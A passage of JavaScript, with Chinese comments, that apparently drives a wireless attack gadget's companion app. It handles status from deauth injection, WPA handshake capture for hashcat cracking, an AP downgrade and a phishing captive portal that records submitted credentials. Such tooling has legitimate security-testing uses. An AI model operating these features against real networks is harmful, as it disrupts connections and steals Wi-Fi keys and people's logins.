        for (let i = 4; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (kind === 'START'){
            if (advAck){ clearTimeout(advAck); advAck = null; }
            advNoAck = false;
            advSt.active = true;
            advSt.type = kv.type || advMode;
            advSt.dur = parseInt(kv.dur || '0') || 0;
            advSt.remain = advSt.dur;
            advSt.link = '正常';
            startAdvTick(); updateAdvUI();
            log('[BLE 伪装] 已开始 · ' + advTypeZh(advSt.type) +
                (advSt.dur ? ' · ' + advSt.dur + 's' : '') +
                (kv.uuid ? ' · uuid ' + kv.uuid : '') + (kv.url ? ' · ' + kv.url : ''), 'ok');
            toast('BLE 伪装已开始', 'ok');
        } else if (kind === 'STOP'){
            advSt.active = false; advSt.remain = 0; advSt.link = '已恢复'; advNoAck = false;
            stopAdvTick(); updateAdvUI();
            log('[BLE 伪装] 已停止 · 连接广播已恢复', 'warn');
            toast('伪装已停止，连接广播已恢复', 'warn');
        } else if (kind === 'STATUS'){
            advSt.active = kv.active === '1';
            advSt.type = kv.type || 'none';
            advSt.remain = parseInt(kv.remain || '0') || 0;
            advSt.link = advSt.active ? '正常' : '已恢复';
            if (advSt.active) startAdvTick(); else stopAdvTick();
            updateAdvUI();
            log('[BLE 伪装] 状态: ' + (advSt.active
                ? ('进行中 · ' + advTypeZh(advSt.type) + ' · 剩余 ' + advSt.remain + 's')
                : '空闲'), 'meta');
        } else if (kind === 'ERR'){
            if (advAck){ clearTimeout(advAck); advAck = null; }
            advSt.active = false; stopAdvTick(); updateAdvUI();
            const msg = kv.msg || p.slice(4).join(',') || '未知错误';
            log('[BLE 伪装] 失败: ' + msg, 'err');
            toast('BLE 伪装失败: ' + msg, 'err');
        } else {
            log(line, 'meta');
        }
        return;
    }

    /* 工具台: BLE 发射功率 (META,BLE,POWER,<level|set>,...)
     * level,<0-15>,dbm,<n>  /  set,<n>,err,<n> */
    if (line.startsWith('META,BLE,POWER,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (p[3] === 'set'){
            const lv = parseInt(kv.set !== undefined ? kv.set : kv.n);
            const err = parseInt(kv.err || '0') || 0;
            if (!isNaN(lv)) setBlePowerUI(lv);
            if (err === 0){
                log('[BLE 功率] 已设为 level ' + lv + ' (' + blePwrDbm(lv) + ' dBm)', 'ok');
                toast('BLE 功率 level ' + lv + ' (' + blePwrDbm(lv) + ' dBm)', 'ok');
            } else {
                log('[BLE 功率] 设置失败 (err=' + err + ')', 'err');
                toast('BLE 功率设置失败', 'err');
            }
        } else if (p[3] === 'level'){
            const lv = parseInt(kv.level || '0') || 0;
            setBlePowerUI(lv);
            const dbm = (kv.dbm !== undefined) ? (parseInt(kv.dbm) || 0) : blePwrDbm(lv);
            setText(['blePwrDbm'], dbm + ' dBm');
            log('[BLE 功率] 当前 level ' + lv + ' (' + dbm + ' dBm)', 'meta');
        } else {
            log(line, 'meta');
        }
        return;
    }

    /* 工具台: FTM 测距 (META,FTM,<REPORT|ERR>,...) */
    if (line.startsWith('META,FTM,')){
        const p = line.split(',');
        const kind = p[2];
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (kind === 'REPORT'){
            if (ftmWait){ clearTimeout(ftmWait); ftmWait = null; }
            ftmSt = {
                peer: kv.peer || '', status: kv.status || 'FAIL',
                code: parseInt(kv.status_code || '0') || 0,
                distCm: parseInt(kv.dist_cm || '0') || 0,
                distM: parseFloat(kv.dist_m || '0') || 0,
                rttEst: parseInt(kv.rtt_est_ns || '0') || 0,
                rttRaw: parseInt(kv.rtt_raw_ns || '0') || 0,
                entries: parseInt(kv.entries || '0') || 0
            };
            ftmBursts = [];
            setBtnLoading('ftmRun', false);
            renderFtmResult();
            const okr = ftmSt.status === 'SUCCESS';
            log('[FTM] ' + ftmSt.status + (okr ? ' · ' + ftmSt.distM.toFixed(2) + ' m' : '') +
                ' · ' + ftmStatusZh(ftmSt.status), okr ? 'ok' : 'warn');
            toast(okr ? ('测距 ' + ftmSt.distM.toFixed(2) + ' m')
                      : ('测距失败: ' + ftmStatusZh(ftmSt.status)), okr ? 'ok' : 'err');
        } else if (kind === 'ERR'){
            if (ftmWait){ clearTimeout(ftmWait); ftmWait = null; }
            setBtnLoading('ftmRun', false);
            const raw = kv.msg || ('code ' + (kv.code || '?'));
            const zh = (kv.msg === 'timeout') ? '测距超时（目标无响应）'
                     : (kv.msg === 'bad_bssid') ? 'BSSID 格式非法' : raw;
            setText(['ftmState'], '失败 · ' + zh);
            log('[FTM] 失败: ' + zh, 'err');
            toast('FTM 失败: ' + zh, 'err');
        } else {
            log(line, 'meta');
        }
        return;
    }
    if (line.startsWith('FTM,BURST,')){
        /* FTM,BURST,<i>,rssi,<d>,rtt_ps,<u> */
        const p = line.split(',');
        ftmBursts.push({
            i: parseInt(p[2] || '0') || 0,
            rssi: parseInt(p[4] || '0') || 0,
            rtt: parseInt(p[6] || '0') || 0
        });
        renderFtmBursts();
        return;
    }

    /* 工具台: 802.15.4 嗅探 (META,ZB,<KIND>,...) */
    if (line.startsWith('META,ZB,')){
        const p = line.split(',');
        const kind = p[2];
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (kind === 'START'){
            zbSt.on = true;
            zbSt.ch = parseInt(kv.channel || '0') || 0;
            radar('zbRadar', true);
            startZbPoll(); updateZbUI();
            log('[802.15.4] 开始嗅探 · CH' + zbSt.ch, 'ok');
            toast('802.15.4 嗅探中 · CH' + zbSt.ch, 'ok');
        } else if (kind === 'PROGRESS'){
            zbSt.total  = parseInt(kv.total || '0') || 0;
            zbSt.frames = parseInt(kv.frames || '0') || 0;
            zbSt.drops  = parseInt(kv.drops || '0') || 0;
            if (kv.channel) zbSt.ch = parseInt(kv.channel) || zbSt.ch;
            updateZbUI();
        } else if (kind === 'STATUS'){
            zbSt.on    = kv.on === '1';
            if (kv.channel) zbSt.ch = parseInt(kv.channel) || 0;
            zbSt.total = parseInt(kv.total || '0') || 0;
            zbSt.frames= parseInt(kv.frames || '0') || 0;
            zbSt.drops = parseInt(kv.drops || '0') || 0;
            zbSt.cap   = parseInt(kv.cap || '0') || 0;
            radar('zbRadar', zbSt.on);
            if (zbSt.on) startZbPoll(); else stopZbPoll();
            updateZbUI();
        } else if (kind === 'STOP'){
            zbSt.on = false;
            stopZbPoll(); radar('zbRadar', false); updateZbUI();
            const e = parseInt(kv.err || '0') || 0;
            log('[802.15.4] 已停止' + (e ? ' (err=' + e + ')' : ''), e ? 'err' : 'warn');
            toast(e ? ('802.15.4 停止异常 (err=' + e + ')') : '802.15.4 已停止', e ? 'err' : 'warn');
        } else if (kind === 'CLEAR'){
            zbList = []; zbExpect = -1;
            zbSt.total = 0; zbSt.frames = 0; zbSt.drops = 0;
            renderZbList(); updateZbUI();
            log('[802.15.4] 已清空', 'warn');
            toast('抓包已清空', 'warn');
        } else if (kind === 'DUMP'){
            zbExpect = parseInt(kv.count || '0') || 0;
            zbList = [];
            if (zbExpect === 0) renderZbList();
            log('[802.15.4] 帧表 ' + zbExpect + ' 条', 'meta');
        } else if (kind === 'ERR'){
            const msg = kv.msg || p.slice(3).join(',') || '未知错误';
            zbSt.on = false; stopZbPoll(); radar('zbRadar', false); updateZbUI();
            log('[802.15.4] 错误: ' + msg, 'err');
            toast('802.15.4: ' + msg, 'err');
        } else {
            log(line, 'meta');
        }
        return;
    }
    if (line.startsWith('ZB,')){
        /* ZB,<i>,len,<n>,rssi,<d>,lqi,<u>,ch,<u>,hex,<hex> */
        const p = line.split(',');
        zbList.push({
            i: parseInt(p[1] || '0') || 0,
            len: parseInt(p[3] || '0') || 0,
            rssi: parseInt(p[5] || '0') || 0,
            lqi: parseInt(p[7] || '0') || 0,
            ch: parseInt(p[9] || '0') || 0,
            hex: p[11] || ''
        });
        if (zbExpect >= 0 && zbList.length >= zbExpect) renderZbList();
        else scheduleZbRender();
        return;
    }

    /* 固件 2.1.0: 场景编排 / 信号定位 / OTA
     * 这三类命令的返回都是纯 META 行, 原版把它们直接灌进日志了事,
     * 用户点了按钮看不出结果. 这里转成卡片里的一行可读文本. */
    if (line.startsWith('META,SCENARIO,')){
        const el = document.getElementById('scHint');
        if (el) el.textContent = scenarioText(line.split(','));
        return;
    }
    if (line.startsWith('META,LOCATE,')){
        const el = document.getElementById('locHint');
        if (el) el.textContent = locateText(line.split(','));
        return;
    }
    if (line.startsWith('META,OTA,')){
        const el = document.getElementById('otaHint');
        if (el) el.textContent = otaText(line.split(','));
        return;
    }

    /* EAPOL 握手 (META,HS,) */
    if (line.startsWith('META,HS,')){
        const p = line.split(',');
        const kind = p[2];
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];

        if (kind === 'STATS'){
            hsSt.seen = [1, 2, 3, 4].map(n => parseInt(kv['seen_m' + n] || '0'));
            updateHsUI();
        } else if (kind === 'ENTRY'){
            hsList.push({
                i: parseInt(kv.i || '0'), bssid: kv.bssid || '', sta: kv.sta || '',
                essid: kv.essid || '-', msgs: parseInt(kv.msgs || '0'),
                pair: kv.pair || 'none', chan: parseInt(kv.chan || '0'),
                rssi: parseInt(kv.rssi || '0'), ts: parseInt(kv.ts || '0')
            });
        } else if (kind === 'LIST'){
            hsSt.total = parseInt(kv.total || '0');
            hsSt.complete = parseInt(kv.complete || '0');
            hsSt.pmkid = parseInt(kv.pmkid || '0');
            updateHsUI();
            renderHsList();
            log('[握手] 记录 ' + hsSt.total + ' 条 · 可破解 ' + hsSt.complete +
                (hsSt.pmkid ? ' · PMKID ' + hsSt.pmkid : '') +
                ' · 已见 M1/M2/M3/M4 = ' + hsSt.seen.join('/'), 'meta');
            if (hsWait){ const r = hsWait; hsWait = null; r(); }
        } else if (kind === 'COMPLETE'){
            log('[握手] 抓到可用握手 ' + (kv.pair || '') + ' · BSSID ' + kv.bssid +
                ' · STA ' + kv.sta + ' · CH' + kv.chan + ' · ' + kv.rssi + 'dBm', 'ok');
            /* Deauth 的唯一成功判据: 目标重新上线并握手成功 */
            if (pendingHs && kv.bssid && kv.bssid.toLowerCase() === pendingHs.bssid){
                const secs = ((Date.now() - pendingHs.t0) / 1000).toFixed(1);
                clearHandshake();
                log('[Deauth] 生效: ' + secs + 's 后 ' + kv.bssid + ' 重新握手 (' + (kv.pair || '') + ')', 'ok');
                toast('Deauth 生效, 已拿到 ' + kv.bssid + ' 的握手', 'ok');
            } else {
                toast('抓到可用握手 (' + (kv.pair || '') + ')', 'ok');
            }
        } else if (kind === '22000'){
            if (p[3] === 'start'){ hsGrab = { lines: [] }; }
            else if (p[3] === 'note'){
                log('[握手] 没有可用握手 (需 M1+M2 或 M2+M3 且 RC 一致, 或 PMKID)', 'warn');
            } else if (p[3] === 'done'){
                if (hsWait){ const r = hsWait; hsWait = null; r(); }
            }
        } else if (kind === 'SELFTEST'){
            log('[握手] 自检 ' + (kv.result === 'pass' ? '通过' : '失败'), kv.result === 'pass' ? 'ok' : 'err');
            toast('握手自检 ' + (kv.result === 'pass' ? '通过' : '失败'), kv.result === 'pass' ? 'ok' : 'err');
        } else if (kind === 'CLEAR'){
            hsList = []; hsSt.total = 0; hsSt.complete = 0;
            updateHsUI(); renderHsList();
        }
        return;
    }

    /* hashcat 22000 行: 只在导出收集时截获, 否则当普通输出 */
    if (line.startsWith('WPA*') && hsGrab){
        hsGrab.lines.push(line);
        return;
    }

    /* 原始帧落盘 (固件输出前缀 META,CAP,) */
    if (line.startsWith('META,CAP,')){
        const p = line.split(',');
        const kind = p[2];
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];

        if (kind === 'START'){
            capSt.on = true;
            capSt.keyonly = kv.keyonly === '1';
            capSt.cap = parseInt(kv.cap || '0');
            updateCapUI();
            toast('已开始落盘' + (capSt.keyonly ? ' (仅关键帧)' : ''), 'ok');
        } else if (kind === 'STOP'){
            capSt.on = false;
            if (kv.frames !== undefined) capSt.frames = parseInt(kv.frames);
            if (kv.drops !== undefined)  capSt.drops  = parseInt(kv.drops);
            if (kv.bytes !== undefined)  capSt.bytes  = parseInt(kv.bytes);
            if (kv.keys !== undefined)   capSt.keys   = parseInt(kv.keys);
            updateCapUI();
            log('[落盘] 已停止 · ' + capSt.frames + ' 帧 / ' +
                fmtBytes(capSt.bytes) + ' / 关键帧 ' + capSt.keys, 'meta');
        } else if (kind === 'CLEAR'){
            capSt = { ...capSt, frames:0, drops:0, bytes:24, keys:0, full:false };
            capIndex = [];
            updateCapUI();
            log('[落盘] 已清空', 'warn');
        } else if (kind === 'INFO'){
            capSt.on      = kv.on === '1';
            capSt.keyonly = kv.keyonly === '1';
            capSt.frames  = parseInt(kv.frames || '0');
            capSt.drops   = parseInt(kv.drops || '0');
            capSt.bytes   = parseInt(kv.bytes || '0');
            capSt.cap     = parseInt(kv.cap || '0');
            capSt.keys    = parseInt(kv.keys || '0');
            capSt.full    = kv.full === '1';
            updateCapUI();
        } else if (kind === 'KEYCOUNT'){
            capIndex = [];
            capSt.keys = parseInt(kv.n || '0');
            updateCapUI();
            if (capKeysWait){
                capKeysWait.expect = capSt.keys;
                capKeysWait.got = 0;
                if (capSt.keys === 0){ const r = capKeysWait.done; capKeysWait = null; r(capIndex); }
            }
        } else if (kind === 'KEY'){
            capIndex.push({
                i: parseInt(kv.i || '0'), kind: parseInt(kv.kind || '0'),
                off: parseInt(kv.off || '0'), len: parseInt(kv.len || '0'),
                ts: parseInt(kv.ts || '0'), chan: parseInt(kv.chan || '0'),
                rssi: parseInt(kv.rssi || '0')
            });
            if (capKeysWait){
                capKeysWait.got++;
                if (capKeysWait.got >= capKeysWait.expect){
                    const r = capKeysWait.done; capKeysWait = null; r(capIndex);
                }
            }
        } else if (kind === 'READ'){
            if (capPull && capReadWait) capPull.lastGot = parseInt(kv.n || '0');
            if (capReadWait){ const r = capReadWait; capReadWait = null; r(); }
        } else if (kind === 'ERR'){
            log('[落盘] 错误: ' + p.slice(3).join(','), 'err');
            if (capReadWait){ const r = capReadWait; capReadWait = null; r(); }
        } else {
            log(line, 'meta');
        }
        return;
    }

    /* 钓鱼门户 (固件输出前缀 META,PHISH,) */
    if (line.startsWith('META,PHISH,')){
        const p = line.split(',');
        const kind = p[2];
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];

        if (kind === 'START'){
            phishOn = true;
            if (kv.html_bytes !== undefined) phishHtmlBytes = parseInt(kv.html_bytes);
            updatePhishUI();
            confirmAction('门户已启动 ' + (kv.ssid || '') + ' @ ' + (kv.ip || ''));
        } else if (kind === 'STOP'){
            phishOn = false; updatePhishUI();
            phishStas = []; renderPhishSta();
            radar('credRadar', false);
            log('[门户] 已停止', 'warn');
        } else if (kind === 'STATUS'){
            phishOn = kv.on === '1';
            phishCredCount = parseInt(kv.creds || '0');
            phishHtmlBytes = parseInt(kv.html_bytes || '0');
            updatePhishUI();
            log('[门户] 状态: ' + (phishOn ? '运行中' : '已停止') +
                ' · 凭据 ' + phishCredCount + ' · 页面 ' + phishHtmlBytes + 'B' +
                ' · ' + (kv.ip || ''), 'meta');
            /* 状态之后顺手拉一次接入客户端, 免得用户还要多按一次 */
            if (phishOn) sendCmd('phish stations');
        } else if (kind === 'STA'){
            phishStas = [];     /* 明细行 PSTA, 紧随其后到达 */
            updatePhishUI();
            renderPhishSta();
            if (kv.err !== undefined){
                if (kv.on === '0') log('[门户] 未运行，先启动门户', 'warn');
                else log('[门户] 客户端查询失败 (err=' + kv.err + ')', 'err');
            } else {
                log('[门户] 已接入客户端: ' + (kv.n || '0') + ' 台', 'meta');
            }
        } else if (kind === 'CREDS'){
            if (p[3] === 'cleared'){
                phishCredCount = 0; phishCreds = []; phishCredCur = null;
                log('[门户] 凭据已清空', 'warn');
            } else {
                phishCredCount = parseInt(kv.count || '0');
                phishCreds = []; phishCredCur = null;
            }
            updatePhishUI(); renderCreds();
        } else if (kind === 'CRED'){
            phishCredCur = { id: parseInt(kv.id || '0'), ip: kv.ip || '', fields: [] };
            phishCreds.push(phishCredCur);
            while (phishCreds.length > 64) phishCreds.shift();
            radar('credRadar', true);
            log('[门户] 捕获凭据 #' + phishCredCur.id + ' (来自 ' + phishCredCur.ip + ')', 'ok');
            toast('捕获凭据 #' + phishCredCur.id, 'ok');
        } else if (kind === 'HTML'){
            if (p[3] === 'BEGIN'){
                confirmAction('开始上传 ' + (kv.size || '?') + ' 字节');
            } else if (p[3] === 'END'){
                phishHtmlBytes = parseInt(kv.size || '0');
                log('[门户] 上传完成，设备端 ' + phishHtmlBytes + ' 字节', 'ok');
                toast('认证页已更新', 'ok');
            } else if (p[3] === 'cleared'){
                phishHtmlBytes = 0;
                log('[门户] 已恢复内置模板', 'warn');
            } else {
                phishHtmlBytes = parseInt(kv.size || '0');
            }
            updatePhishUI();
        } else if (kind === 'ERR'){
            reportRefusal(kv.msg || p.slice(3).join(','),
                          kv.code ? 'code ' + kv.code : '', '门户');
        } else {
            log(line, 'meta');
        }

    /* 门户捕获的表单字段 */
    } else if (line.startsWith('CRED,')){
        const p = line.split(',');
        if (phishCredCur && p.length >= 4){
            phishCredCur.fields.push({ k: p[2], v: p.slice(3).join(',') });
            renderCreds();
        }

    /* 门户已接入客户端明细 */
    } else if (line.startsWith('PSTA,')){
        const p = line.split(',');
        if (p.length >= 4){
            phishStas.push({ mac: p[1], rssi: parseInt(p[3] || '0') });
            updatePhishUI();
            renderPhishSta();
        }

    } else if (line.startsWith('META,WIFI,')){
        const p = line.split(',');
        const kind = p[2];

        if (kind === 'STATUS'){
            const kv = {};
            for (let i=3; i<p.length-1; i+=2) kv[p[i]] = p[i+1];
            const ch = kv.channel || '--';
            setStat('stState', kv.state || 'IDLE');
            setStat('stCh', ch);   setStat('stCh2', ch);
            setStat('stSniff', kv.sniff_total || '0');  setStat('stSniff2', kv.sniff_total || '0');
            setStat('stInject', kv.inject_total || '0'); setStat('stInject2', kv.inject_total || '0');
            setStat('stAps', kv.aps || '0');   setStat('stAps2', kv.aps || '0');
            setStat('stCli', kv.clients || '0'); setStat('stCli2', kv.clients || '0');
            updateBand(kv.auto_ch === '1' ? 'AUTO' : bandOf(ch));
            setJobActive((kv.state || 'IDLE') !== 'IDLE');
            /* 固件回报的 MTU 是实际协商结果, 比 requestMtu 的返回值可靠 */
            if (kv.mtu){
                const m = parseInt(kv.mtu, 10);
                if (m > 0 && m !== negotiatedMtu){ negotiatedMtu = m; updateConnInfo(); }
            }
            /* phy: 0=未协商 1=1M 2=2M 3=Coded.
             * 切到 2M 时同样连接间隔下吞吐翻倍, 值得让用户看见. */
            if (kv.phy !== undefined){
                const ph = parseInt(kv.phy, 10);
                const name = {0:'未协商', 1:'1M', 2:'2M', 3:'Coded'}[ph] || ('?');
                if (name !== linkPhy){
                    linkPhy = name;
                    const el = $('ciMtu');
                    if (el) el.textContent = (negotiatedMtu ? negotiatedMtu + ' B / ' : '') + name;
                }
            }

        } else if (kind === 'SNIFF' && p[3] === 'START'){
            /* META,WIFI,SNIFF,START,channel,N,count,N */
            const ch = p[5] || '?';
            setStat('stCh', ch); setStat('stCh2', ch);
            updateBand(bandOf(ch));
            setJobActive(true);
            confirmAction('已启动 ch=' + ch + ' (' + bandOf(ch) + ') 目标包数=' + (p[7] || '0'));
        } else if (kind === 'SNIFF' && p[3] === 'AUTO'){
            /* META,WIFI,SNIFF,AUTO,START,dwell_ms,N */
            setStat('stCh', 'AUTO'); setStat('stCh2', 'AUTO');
            updateBand('AUTO');
            setJobActive(true);
            confirmAction('已启动 AUTO 轮询 (驻留 ' + (p[6] || '?') + 'ms)');
        } else if (kind === 'SNIFF' && p[3] === 'PROGRESS'){
            /* META,WIFI,SNIFF,PROGRESS,total,N,channel,N,aps,N,clients,N */
            const kv = {};
            for (let i=4; i<p.length-1; i+=2) kv[p[i]] = p[i+1];
            setStat('stSniff', kv.total || '0'); setStat('stSniff2', kv.total || '0');
            if (kv.channel){ setStat('stCh', kv.channel); setStat('stCh2', kv.channel); updateBand(bandOf(kv.channel)); }
            if (kv.aps !== undefined){ setStat('stAps', kv.aps); setStat('stAps2', kv.aps); }
            if (kv.clients !== undefined){ setStat('stCli', kv.clients); setStat('stCli2', kv.clients); }
            setJobActive(true);
            clearPendingAction();
        } else if (kind === 'SNIFF' && p[3] === 'DONE'){
            log('[嗅探] 完成 total=' + (p[5] || '0'), 'warn');
            clearPendingAction();
            setJobActive(false);
            /* 设备端确认停止后立刻拉表收尾, 不再等 3s 兜底超时.
             * 之前只处理了 AP 侧, 客户端扫描得干等定时器, 显得「半天不出结果」. */
            if (apScanning) dumpAps();
            if (cliScanning) dumpClients();
        } else if (kind === 'APS'){
            /* META,WIFI,APS,count,N，dump aps 的头部, 用 N 判定何时收齐 */
            apList.length = 0;
            apExpect = parseInt(p[4] || '0');
            if (apExpect === 0) finishApScan();
        } else if (kind === 'CLIENTS'){
            clientList.length = 0;
            cliExpect = parseInt(p[4] || '0');
            if (cliExpect === 0) finishCliScan();
        } else if (kind === 'INJECT' && p[3] === 'START'){
            /* META,WIFI,INJECT,START,mode,X,count,N,interval,N,channel,N */
            const kv = {};
            for (let i=4; i<p.length-1; i+=2) kv[p[i]] = p[i+1];
            const ch = kv.channel && kv.channel !== '0' ? ' ch=' + kv.channel : '';
            setJobActive(true);
            confirmAction((kv.mode || '?') + ch + ' 已启动 (间隔 ' + (kv.interval || '0') + 'ms)');
        } else if (kind === 'INJECT' && p[3] === 'SUPERSEDED'){
            /* 新的注入接管了旧的. 不提示的话, 上一个作业的收尾在界面上
             * 看起来就跟正常跑完一样. */
            log('[注入] 上一个作业被新任务接管', 'warn');
        } else if (kind === 'INJECT' && p[3] === 'DONE'){
            /* META,WIFI,INJECT,DONE,mode,N,sent,N,err,N,ms,N,stopped,N */
            const kvDone = {};
            for (let i=4; i<p.length-1; i+=2) kvDone[p[i]] = p[i+1];
            const cut = kvDone.stopped === '1';
            const sent = parseInt(kvDone.sent || '0') || 0;
            clearPendingAction();
            setJobActive(false);
            /* deauth(mode=0) 发完帧不算成功: 对面强制 PMF 时帧一样出得去,
             * 按 sent==count 报成功是假成功. 唯一硬指标是后续能不能抓到
             * 握手, 所以这里转入握手等待, 由 META,HS,COMPLETE 收尾. */
            if (kvDone.mode === '0' && !cut && sent > 0 && deauthTarget){
                log('[Deauth] 已发出 ' + sent + ' 帧, 等 ' + (HS_WAIT_MS/1000) +
                    's 看有没有客户端重连握手', 'meta');
                expectHandshake(deauthTarget, sent);
            } else {
                log('[注入] ' + (cut ? '被中止' : '完成') + ' sent=' + sent +
                    (kvDone.err && kvDone.err !== '0' ? ' err=' + kvDone.err : ''), cut ? 'err' : 'warn');
            }
        } else if (kind === 'INJECT' && p[3] === 'ERR'){
            const name = p[7] || p[5] || '';
            log('[注入] 错误 ' + name, 'err');
            clearPendingAction();
        } else if (kind === 'DEAUTH' && p[3] === 'DETECTED'){
            log('[Deauth] 检测到 ' + (p[5] || '') + ' → ' + (p[7] || '') + ' rssi=' + (p[9] || ''), 'meta');
        } else if (kind === 'EAPOL' && p[3] === 'DETECTED'){
            log('[EAPOL] 握手捕获! ' + (p[5] || '') + ' → ' + (p[7] || ''), 'ok');
            toast('EAPOL 握手捕获!', 'ok');
        } else if (kind === 'EAPOL' && p[3] === 'count'){
            log('[EAPOL] 数据库共 ' + (p[4] || '0') + ' 条', 'meta');
        } else if (kind === 'DOWNGRADE' && p[3] === 'START'){
            confirmAction('降级 AP 已启动: ' + (p[5] || ''));
        } else if (kind === 'DOWNGRADE' && p[3] === 'STOP'){
            log('[降级] 已停止', 'warn');
            clearPendingAction();
        } else if (kind === 'DUMP'){
            /* META,WIFI,DUMP,CLEARED,aps,0,clients,0,eapols,0 */
            clearPendingAction();
            log('[数据库] 已清空', 'warn');
            toast('设备端数据库已清空', 'warn');
        } else if (kind === 'AUTO'){
            /* 自适应轮询的统计行 (STATS + 每信道一行), 随 status 轮询一起发.
             * App 没有对应视图, 直接进日志会每 3 秒塞 9 行, 把真实输出冲掉;
             * 需要时看串口或 CLI 的 status. */
        } else if (kind === 'EXPORT'){
            /* META,WIFI,EXPORT,<fmt>,start
             * META,WIFI,EXPORT,<fmt>,done,aps,N,clients,N,eapols,N */
            const fmt = p[3], phase = p[4];
            if (phase === 'start'){
                exportCap = { fmt, lines: [] };
                toast('正在接收 ' + fmt.toUpperCase() + ' 导出…', 'warn');
            } else if (phase === 'done' && exportCap && exportCap.fmt === fmt){
                const cap = exportCap; exportCap = null;
                const isJson = fmt === 'json';
                log('[导出] ' + fmt.toUpperCase() + ' 完成 · ' + p.slice(5).join(' ') +
                    ' · ' + cap.lines.length + ' 行', 'meta');
                saveFile('rftool-' + fmt + '-' + stamp() + (isJson ? '.json' : '.csv'),
                         cap.lines.join('\n'),
                         isJson ? 'application/json' : 'text/csv');
            } else {
                log('[导出] ' + p.slice(3).join(' '), 'meta');
            }
        } else if (kind === 'ERR'){
            /* META,WIFI,ERR,msg,X[,code,N] */
            const kv = {};
            for (let i=3; i<p.length-1; i+=2) kv[p[i]] = p[i+1];
            reportRefusal(kv.msg || p.slice(3).join(','),
                          kv.code ? 'code ' + kv.code : '');
        } else {
            log(line, 'meta');
        }

    } else if (line.startsWith('AP,')){
        const p = line.split(',');
        if (p.length >= 11){
            const bssid = p[1];
            const ssid = p[2] || '(hidden)';
            const ch = parseInt((p[3]||'ch0').replace('ch',''));
            const rssi = parseInt((p[4]||'rssi0').replace('rssi',''));
            const enc = p[5] || '';
            /* 固件发的是 "HIDDEN"/"VISIBLE", 兼容旧的 "1"/"0" */
            const hidden = (p[6] || '').toUpperCase() === 'HIDDEN' || p[6] === '1';
            const pmf = (p[7] || '').replace('pmf','') === '1';
            const vendor = p[10] || '';
            /* 第 11 项起是 key,value 对 (akm,PSK/SAE,cip,CCMP,bw,80,std,11ax,wps,0,pmfc,1,crk,1) */
            const caps = {};
            for (let i = 11; i + 1 < p.length; i += 2) caps[p[i]] = p[i+1];
            const rec = { bssid, ssid, channel:ch, rssi, enc, hidden, vendor, pmf, caps };
            const existing = apList.find(a => a.bssid === bssid);
            if (existing) Object.assign(existing, rec);
            else apList.push(rec);
            renderApList();
            /* 头部声明了条数就以它为准收尾, 不再靠猜时间 */
            if (apExpect >= 0 && apList.length >= apExpect) finishApScan();
        }
    } else if (line.startsWith('CLIENT,')){
        const p = line.split(',');
        if (p.length >= 6){
            const mac = p[1], bssid = p[2];
            const rssi = parseInt((p[3]||'rssi0').replace('rssi',''));
            const pkts = parseInt((p[4]||'pkts0').replace('pkts',''));
            const vendor = p[5] || '';
            /* hist,-50|-52|-49... 最新在最后 */
            let hist = null;
            if (p[6] === 'hist' && p[7]) {
                hist = p[7].split('|').map(v => parseInt(v)).filter(v => !isNaN(v));
            }
            const rec = { mac, bssid, rssi, pkts, vendor };
            if (hist && hist.length) rec.hist = hist;
            const existing = clientList.find(c => c.mac === mac);
            if (existing) Object.assign(existing, rec);
            else clientList.push(rec);
            renderClientList();
            if (cliExpect >= 0 && clientList.length >= cliExpect) finishCliScan();
        }
    } else if (line.startsWith('PKT,WIFI,')){
        const cur = parseInt($('stSniff').textContent) || 0;
        setText(['stSniff','stSniff2'], String(cur + 1));
    } else if (line.startsWith('HEX,')){
        /* 原始帧, 忽略 */
    } else if (/^(error|err|fail)/i.test(line) || line.includes('ERR')){
        log(line, 'err');
    } else {
        log(line);
    }
}

/*
   命令队列发送
 */
function sendCmd(cmd){
    if (!connected){ toast('未连接设备', 'err'); log('未连接设备', 'err'); return; }
    cmdQueue.push(cmd);
    processCmdQueue();
}

async function processCmdQueue(){
    if (cmdSending || cmdQueue.length === 0) return;
    cmdSending = true;
    const cmd = cmdQueue.shift();
    try {
        dlog('[NUS] TX cmd="' + cmd + '"');
        await nusWrite(cmd);
        dlog('[NUS] 写入完成');
    } catch(e){
        log('发送失败: ' + e.message, 'err');
        dlog('[NUS] 异常: ' + e.message + ' (cmd="' + cmd + '")');
    } finally {
        /* 命令间隔 */
        setTimeout(() => {
            cmdSending = false;
            processCmdQueue();
        }, CMD_INTERVAL);
    }
}

/*
   WiFi AP / 客户端扫描
 */
let apScanning   = false;
let apScanTimer  = null;
let apScanLeft   = 0;
let apExpect     = -1;      /* dump aps 头部声明的条数, -1 = 未知 */
let cliExpect    = -1;
let cliScanning  = false;
let cliScanTimer = null;
let cliScanLeft  = 0;
let cliDumpFallback = null;
let bleScanning   = false;
let blePollTimer  = null;

function apScanState(txt){ const el = $('apScanState'); if (el) el.textContent = txt; }
function cliScanState(txt){ const el = $('cliScanState'); if (el) el.textContent = txt; }
function bleScanState(txt){ const el = $('bleScanState'); if (el) el.textContent = txt; }

/* 启动嗅探发现 AP. secs 秒后自动停, 再拉取追踪表.
 * 关键: 之前这里判断 apList.length===0 就 return, 而 apList 正是靠后面
 * 那句 dump aps 才会被填充，于是 dump 永远发不出去, 列表永远是空. */
function scanAps(secs){
    if (!connected){ toast('请先连接设备', 'err'); return; }
    if (apScanning){ toast('扫描进行中', 'warn'); return; }
    apScanning = true;
    apExpect = -1;
    apList.length = 0;
    renderApList();
    radar('apRadar', true);
    setJobActive(true);
    $('apPanel')?.classList.add('open');
    $('apList').innerHTML = '<div class="list-empty">正在扫描附近 AP…</div>';

    apScanLeft = secs;
    apScanState('扫描中 ' + apScanLeft + 's · 已发现 0 个');
    if (apScanTimer) clearInterval(apScanTimer);
    apScanTimer = setInterval(() => {
        apScanLeft--;
        if (apScanning) {
            apScanState('扫描中 ' + Math.max(apScanLeft, 0) + 's · 已发现 ' +
                        apList.length + ' 个');
        }
        if (apScanLeft <= 0){ clearInterval(apScanTimer); apScanTimer = null; }
    }, 1000);

